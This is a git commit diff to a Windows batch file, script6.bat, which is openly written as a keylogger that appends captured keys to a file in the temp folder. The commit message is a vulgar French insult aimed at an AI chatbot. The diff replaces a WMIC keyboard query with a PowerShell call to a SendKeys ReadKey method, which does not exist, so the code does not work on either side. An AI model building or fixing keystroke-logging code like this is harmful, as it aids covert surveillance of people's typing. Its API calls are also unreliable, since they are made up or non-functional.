158383b9150a0c00d95183c07ff83d40a8cde8e9
Elohyrr <118767910+Elohyrr@users.noreply.github.com>
2024-02-06 18:34:20 +0100

    Nique ta mère ChatCGT plus inutile que Clayton

--- script6.bat
+++ script6.bat
@@ -4,11 +4,5 @@ setlocal EnableDelayedExpansion
 set "logfile=%TEMP%\keylogger.txt"
 
 :listen
-timeout /t 1 /nobreak >nul
-for /f "tokens=2 delims=," %%A in ('"wmic path Win32_Keyboard get ScanCode"') do (
-    set "key=%%A"
-)
-if not "%key%"=="" (
-    echo !key!>>"%logfile%"
-)
+powershell.exe -Command "& {Add-Type -AssemblyName System.Windows.Forms; $key = [System.Windows.Forms.SendKeys]::ReadKey(); Out-File -FilePath '%logfile%' -Append -InputObject $key}"
 goto listen
